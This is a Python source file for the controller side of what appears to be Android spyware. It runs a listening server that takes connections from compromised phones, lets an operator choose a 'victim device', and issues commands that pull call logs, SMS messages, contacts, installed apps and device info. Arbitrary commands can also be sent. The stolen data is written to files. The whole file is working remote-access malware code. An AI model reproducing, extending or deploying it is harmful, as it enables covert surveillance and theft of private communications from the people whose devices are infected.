import socket
from threading import Thread
import sys
import time

port = 22222
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(('', port)) 

server.listen()
print("listening for connections...")

all_clients={}

isSessionAlive = False

def stable_recv(listen_client):
    total_data = []
    
    while True:
      try:
        data = listen_client.recv(1024).decode(errors='ignore')
        if not data:
          total_data.append("connection to " + all_clients[listen_client] + "closed !")
          break
        else:
          if "EOFExceptionReceived" in data:
            total_data.append(data.replace("EOFExceptionReceived", ""))
            break
          else:
            total_data.append(data)
      except Exception as e:
        print(e)
        pass
	       
        
    return ''.join(total_data)

def help():
	print("""
				getCallLogs   - get All call Logs from victim device
				""")
				
def startSession(client):
	client_name = all_clients[client]
	while True:
		if isSessionAlive:
			sendData = input(" > ")
			if sendData == "exit":
				break
			elif sendData == "help":
				help()
			elif sendData == "getCallLogs":
				stable_send(client, sendData)
				print("[ info ] requesting call logs -")
				callLogs = stable_recv(client)
				with open(f"/sdcard/{client_name}-callLogs.txt", "w+") as f:
					f.write(callLogs)
				print(f"[ success ] saved at /sdcard/{client_name}-callLogs.txt")
			
			elif sendData == "getSmsLogs":
				stable_send(client, sendData)
				print("[ info ] requesting sms logs -")
				smsLogs = stable_recv(client)
				with open(f"/sdcard/{client_name}-smsLogs.txt", "w+") as f:
					f.write(smsLogs)
				print(f"[ success ] saved at /sdcard/{client_name}-smsLogs.txt")
			
			elif sendData == "getInfo":
				stable_send(client, sendData)
				infos = stable_recv(client)
				print(infos)
				
			elif sendData == "getContacts":
				stable_send(client, sendData)
				contacts = stable_recv(client)
				with open(f"/sdcard/{client_name}-contacts.txt", "w+") as f:
					f.write(contacts)
				print(f"[ success ] saved at /sdcard/{client_name}-contacts.txt")

			elif sendData == "getApps":
				stable_send(client, sendData)
				apps = stable_recv(client)
				with open(f"/sdcard/{client_name}-apps.txt", "w+") as f:
					f.write(apps)
				print(f"[ success ] saved at /sdcard/{client_name}-apps.txt")	
			
			else:
				stable_send(client, sendData)
				msg = stable_recv(client)
				print(msg)
		else:
			server.close()
			break



def handle_devices():
		global server
		while True:
			getDevice = input("SDevice > ")
			if getDevice == "show":
				count = 1
				for client in all_clients:
					print(f"[ {count} ]  {all_clients[client]}")
					count+=1
			elif "run " in getDevice:
				#try:
				index = int(getDevice.split(' ')[-1]) - 1
				startSession(tuple(all_clients.items())[index][0])
				#except Exception as e:
				#	print(e)
			elif getDevice == "exit":
				server.close()
			else:
				print("[ error ] command not found!")
								
def stable_send(client, Cmd):
	global isSessionAlive
	try:
		data = Cmd.encode('UTF-8')
		client.send(len(data).to_bytes(2, byteorder='big'))
		client.send(data)
	except:
		print(all_clients[client], 'disconnected !')
		del all_clients[client]
		if not bool(all_clients):
			isSessionAlive = False
			print('[ info ] no active devices')
		else:
			Thread(target=handle_devices).start()
			
		
def handle_new_client(client):
    global isSessionAlive
    client_name = stable_recv(client)
    all_clients[client] = client_name
    print(f" {client_name}")
    if not isSessionAlive:
            isSessionAlive = True
            Thread(target=handle_devices).start()

while True:
    try:
        client, address = server.accept()
        print("[ + ] Received a connection from", end="")
        Thread(target=handle_new_client, args=[client, ]).start()
    except:
        server.close()
        break
	
